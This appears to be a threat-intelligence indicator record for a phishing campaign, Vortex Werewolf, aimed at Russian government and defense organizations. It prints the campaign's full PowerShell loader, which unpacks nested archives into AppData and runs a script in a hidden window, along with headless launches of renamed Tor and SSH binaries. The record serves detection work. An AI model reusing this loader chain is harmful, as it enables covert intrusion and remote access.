title: 'Approaching cyclone: Vortex Werewolf attacks Russia'
description: Vortex Werewolf targeted Russian government and defense organizations
  using phishing emails disguised as Telegram filesharing URLs, delivering malware
  that installs Tor and OpenSSH for remote access.
attribution: ''
malware_families: []
cves: []
ttps:
  processes:
  - photoshopexpress.exe
  - finalcutpro.exe
  - sshshellhost.exe
  - powershell.exe
  - conhost.exe
  command_lines:
  - powershell.exe $mainConfigCapacity = (where.exe /r $env:USERPROFILE 'Spisok na
    peremeshchenie.zip') | select -First 1; $permanentDetailResult=$mainConfigCapacity.Trim();
    Expand-Archive $permanentDetailResult -DestinationPath $env:APPDATA\projectDuration;
    $permanentDetailResult=$env:APPDATA+'\projectDuration\System Volume Information\logLength';
    $entryResult=$permanentDetailResult+'.zip'; Rename-Item -Path $permanentDetailResult
    -NewName $entryResult; Expand-Archive -Path $entryResult -DestinationPath $env:APPDATA\reaper;
    $activeModeArray = gc $env:APPDATA\reaper\totalQuerySignal; Start-Process -WindowStyle
    Hidden powershell $activeModeArray
  - conhost headless %AppData%/reaper/finalcutpro.exe -f transactionMapcurrentPlanMode.xml
  - conhost headless %AppData%/reaper/photoshopexpress.exe -f firstPathLabel
  powershell:
  - $mainConfigCapacity = (where.exe /r $env:USERPROFILE 'Spisok na peremeshchenie.zip')
    | select -First 1; $permanentDetailResult=$mainConfigCapacity.Trim(); Expand-Archive
    $permanentDetailResult -DestinationPath $env:APPDATA\projectDuration; $permanentDetailResult=$env:APPDATA+'\projectDuration\System
    Volume Information\logLength'; $entryResult=$permanentDetailResult+'.zip'; Rename-Item
    -Path $permanentDetailResult -NewName $entryResult; Expand-Archive -Path $entryResult
    -DestinationPath $env:APPDATA\reaper; $activeModeArray = gc $env:APPDATA\reaper\totalQuerySignal;
    Start-Process -WindowStyle Hidden powershell $activeModeArray
  scripts: []
  registry_keys: []
  image_loads:
  - libcrypto.dll
  network_connections:
